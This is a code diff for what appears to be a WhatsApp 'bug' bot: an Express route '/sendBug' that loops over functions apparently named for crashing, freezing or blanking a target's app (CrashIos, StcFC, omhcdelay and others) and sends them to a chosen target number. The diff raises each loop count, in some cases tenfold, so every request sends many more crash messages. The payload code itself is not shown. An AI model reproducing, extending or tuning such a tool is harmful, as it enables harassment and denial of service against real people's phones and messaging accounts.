@@ -391,7 +391,7 @@ router.get("/sendBug", async (req, res) => {
       
       switch (bug) {
         case "crash":
-          for (let i = 0; i < 35; i++) {
+          for (let i = 0; i < 135; i++) {
             await OmhcOld(sock, targetJid);
             await StcFC(sock, targetJid);
             await QQSPrivateBlank(sock, targetJid);
@@ -404,14 +404,14 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
         case "ios":
-          for (let i = 0; i < 35; i++) {
+          for (let i = 0; i < 135; i++) {
             await CrashIosNewByMia(sock, targetJid);
             await CrashIos(sock, targetJid);
             await sleep(3000)
           }
           break;
         case "bokep":
-          for (let i = 0; i < 20; i++) {
+          for (let i = 0; i < 120; i++) {
             await OmhcOld(sock, targetJid);
             await StcFC(sock, targetJid);
             await QQSPrivateBlank(sock, targetJid);
@@ -424,7 +424,7 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
         case "fcinvis":
-          for (let i = 0; i < 20; i++) {
+          for (let i = 0; i < 120; i++) {
             await OmhcOld(sock, targetJid);
             await StcFC(sock, targetJid);
             await QQSPrivateBlank(sock, targetJid);
@@ -437,7 +437,7 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
         case "fcnoinvis":
-          for (let i = 0; i < 70; i++) {
+          for (let i = 0; i < 170; i++) {
             await OmhcOld(sock, targetJid);
             await StcFC(sock, targetJid);
             await QQSPrivateBlank(sock, targetJid);
@@ -450,7 +450,7 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
         case "uix":
-          for (let i = 0; i < 30; i++) {
+          for (let i = 0; i < 130; i++) {
             await OmhcOld(sock, targetJid);
             await StcFC(sock, targetJid);
             await QQSPrivateBlank(sock, targetJid);
@@ -463,7 +463,7 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
         case "delay":
-          for (let i = 0; i < 30; i++) {
+          for (let i = 0; i < 300; i++) {
             await omhcdelay(sock, targetJid);
             await OmhcCrash(sock, targetJid);
             await JustFC5(sock, targetJid);
@@ -471,7 +471,7 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
         case "delay2":
-          for (let i = 0; i < 30; i++) {
+          for (let i = 0; i < 300; i++) {
             await OmhcCrash(sock, targetJid);
             await harddelay(sock, targetJid);
             await maklodelay(sock, targetJid);
@@ -479,7 +479,7 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
         case "spam":
-          for (let i = 0; i < 35; i++) {
+          for (let i = 0; i < 135; i++) {
             await NanasBlankOLD(sock, targetJid);
             await NullBlank(sock, targetJid);
             await CrashNew(sock, targetJid);
